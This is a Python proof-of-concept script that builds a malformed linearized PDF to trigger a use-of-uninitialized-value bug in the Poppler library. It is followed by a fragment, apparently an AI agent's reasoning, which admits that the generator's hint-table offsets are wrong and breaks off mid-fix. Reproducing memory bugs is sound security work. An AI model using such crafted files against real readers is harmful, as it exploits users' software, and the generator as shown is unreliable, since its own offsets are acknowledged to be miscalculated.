#!/usr/bin/env python3
"""Generate a PoC PDF that triggers use-of-uninitialized-value in Poppler."""

import struct

def build_poc():
    # Hints bit data - this is the stream content inside the hints object
    hints_bit_data = b''
    # nObjectLeast = 1 (32 bits)
    hints_bit_data += struct.pack('>I', 1)
    # objectOffsetFirst = 100 (32 bits)
    hints_bit_data += struct.pack('>I', 100)
    # nBitsDiffObjects = 1 (16 bits)
    hints_bit_data += struct.pack('>H', 1)
    # pageLengthLeast = 100 (32 bits)
    hints_bit_data += struct.pack('>I', 100)
    # nBitsDiffPageLength = 1 (16 bits)
    hints_bit_data += struct.pack('>H', 1)
    # OffsetStreamLeast = 0 (32 bits)
    hints_bit_data += struct.pack('>I', 0)
    # nBitsOffsetStream = 1 (16 bits)
    hints_bit_data += struct.pack('>H', 1)
    # lengthStreamLeast = 0 (32 bits)
    hints_bit_data += struct.pack('>I', 0)
    # nBitsLengthStream = 1 (16 bits)
    hints_bit_data += struct.pack('>H', 1)
    # nBitsNumShared = 1 (16 bits)
    hints_bit_data += struct.pack('>H', 1)
    # nBitsShared = 1 (16 bits)
    hints_bit_data += struct.pack('>H', 1)
    # nBitsNumerator = 1 (16 bits)
    hints_bit_data += struct.pack('>H', 1)
    # denominator = 1 (16 bits)
    hints_bit_data += struct.pack('>H', 1)
    # nObjects[0] = 1 + readBits(1) = 2
    hints_bit_data += b'\x80'
    # pageLength[0] = 100 + readBits(1) = 101
    hints_bit_data += b'\x80'
    # numSharedObject[0] = readBits(1) = 0
    hints_bit_data += b'\x00'

    # Build the hints object as a string
    shared_stream_offset = 0
    hints_obj_num = 5
    hints_obj_content = (
        f'{hints_obj_num} 0 obj\n'
        f'<< /S {shared_stream_offset} /Length {len(hints_bit_data)} >>\n'
        f'stream\n'
    ).encode() + hints_bit_data + b'\nendstream\nendobj\n'

    # Build PDF
    header = b'%PDF-1.4\n%\xFF\xFF\xFF\xFF\n'
    
    # Object 1: Linearization dict (template, will fix up later)
    obj1_template = (
        b'1 0 obj\n'
        b'<< /Linearized 1 /L {file_len} /O 2 /E 100 /N 1 /T {xref_offset}'
        b' /H [ {hints_offset} {hints_len} ] /P 0 >>\n'
        b'endobj\n'
    )
    
    # Object 2: First page
    obj2 = b'2 0 obj\n<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] >>\nendobj\n'
    
    # Object 3: Pages
    obj3 = b'3 0 obj\n<< /Type /Pages /Kids [2 0 R] /Count 1 >>\nendobj\n'
    
    # Object 4: Catalog
    obj4 = b'4 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n'
    
    # Calculate offsets
    # First pass: use placeholder for obj1
    obj1_placeholder = obj1_template.replace(b'{file_len}', b'0').replace(b'{xref_offset}', b'0').replace(b'{hints_offset}', b'0').replace(b'{hints_len}', str(len(hints_obj_content)).encode())
    
    pdf = bytearray()
    pdf.extend(header)
    obj1_start = len(pdf)
    pdf.extend(obj1_placeholder)
    obj2_start = len(pdf)
    pdf.extend(obj2)
    obj3_start = len(pdf)
    pdf.extend(obj3)
    obj4_start = len(pdf)
    pdf.extend(obj4)
    hints_offset = len(pdf)
    pdf.extend(hints_obj_content)
    xref_start = len(pdf)
    
    # XRef
    num_objects = 6
    xref = f'xref\n0 {num_objects}\n0000000000 65535 f \n'
    xref += f'{obj1_start:010d} 00000 n \n'
    xref += f'{obj2_start:010d} 00000 n \n'
    xref += f'{obj3_start:010d} 00000 n \n'
    xref += f'{obj4_start:010d} 00000 n \n'
    xref += f'{hints_offset:010d} 00000 n \n'
    pdf.extend(xref.encode())
    
    # Trailer
    trailer = f'trailer\n<< /Size {num_objects} /Root 4 0 R >>\n'
    pdf.extend(trailer.encode())
    pdf.extend(b'startxref\n')
    pdf.extend(f'{xref_start}\n'.encode())
    pdf.extend(b'%%EOF\n')
    
    file_len = len(pdf)
    
    # Fix obj1
    obj1_fixed = obj1_template.replace(b'{file_len}', str(file_len).encode())
    obj1_fixed = obj1_fixed.replace(b'{xref_offset}', str(xref_start).encode())
    obj1_fixed = obj1_fixed.replace(b'{hints_offset}', str(hints_offset).encode())
    obj1_fixed = obj1_fixed.replace(b'{hints_len}', str(len(hints_obj_content)).encode())
    
    # Replace obj1 in the PDF
    pdf[obj1_start:obj1_start+len(obj1_placeholder)] = obj1_fixed
    
    return bytes(pdf)

pdf = build_poc()
with open('/workspace/poc.pdf', 'wb') as f:
    f.write(pdf)
print(f"PoC PDF written: {len(pdf)} bytes")

# Verify
with open('/workspace/poc.pdf', 'rb') as f:
    data = f.read()

# Check linearization dict
import re
m = re.search(rb'/H \[ (\d+) (\d+) \]', data)
if m:
    hints_off = int(m.group(1))
    hints_len = int(m.group(2))
    print(f"/H offset={hints_off} length={hints_len}")
    print(f"Hints data at offset {hints_off}: {data[hints_off:hints_off+min(50, hints_len)]}")

But wait, looking at the code again:
```cpp

hintsLength = linearization->getHintsLength();
```

The `/H` array is `[hintsOffset hintsLength]`. In our PDF, the linearization dictionary says `/H [ 271 39 ]`. But the actual hints object starts at 277 and has length 93.

The issue is that our generator calculated the wrong offset. Let me fix the generator:
